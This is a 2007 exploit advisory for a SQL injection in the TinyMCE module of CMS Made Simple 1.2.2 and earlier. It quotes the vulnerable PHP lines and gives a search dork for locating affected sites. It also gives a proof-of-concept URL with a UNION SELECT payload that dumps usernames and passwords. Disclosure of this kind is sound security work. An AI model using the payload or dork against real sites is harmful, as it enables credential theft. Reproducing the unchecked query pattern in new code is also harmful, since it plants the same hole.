@@ -1,0 +1,39 @@
+-------------------------------------------------------------------------
+CMS Made Simple <= 1.2.2 (TinyMCE module) - Remote SQL Injection Advisory
+-------------------------------------------------------------------------
+
+author...: EgiX
+mail.....: n0b0d13s[at]gmail[dot]com
+
+link.....: http://www.cmsmadesimple.org/
+dork.....: "This site is powered by CMS Made Simple version 1.2.2"
+
+[-] Vulnerable code in /modules/TinyMCE/content_css.php :
+
+ 26.	$templateid = '';
+ 27.	if (isset($_GET["templateid"])) $templateid = $_GET["templateid"]; <==
+ 28.
+ 29.	$mediatype = '';
+ 30.	if (isset($_GET["mediatype"])) $mediatype = $_GET["mediatype"];
+ 31.
+ 32.	$name = '';
+ 33.	if (isset($_GET['name'])) $name = $_GET['name'];
+
+ 64.		if ($name != '')
+ 65.			$sql="SELECT css_text, css_name FROM ".$config['db_prefix']."css WHERE css_name = '" . mysql_real_escape_string($name, $db) . "'";
+ 66.		else
+ 67.			$sql="SELECT c.css_text, c.css_id, c.css_name FROM ".$config['db_prefix']."css c,".$config['db_prefix']."css_assoc ac WHERE ac.assoc_type='template' AND ac.assoc_to_id = $templateid  (...) <==
+ 68.		$result=mysql_query($sql);
+ 69.	//		echo $sql;
+ 70.		while ($result && $row = mysql_fetch_assoc($result))
+ 71.		{
+ 72.			$css .= "/* Start of CMSMS style sheet '{$row['css_name']}' */\n{$row['css_text']}\n/* End of '{$row['css_name']}' */\n";
+ 73.		}
+ 
+ $_GET["templateid"] isn't properly checked at line 27, this results in a sql injection at line 67
+ 
+[*] An attacker can break database through browser! P.o.C. :
+
+http://[host]/[path]/modules/TinyMCE/content_css.php?templateid=-1/**/UNION/**/SELECT/**/username,1,password/**/FROM/**/{prefix}_users/*
+
+# milw0rm.com [2007-12-30]
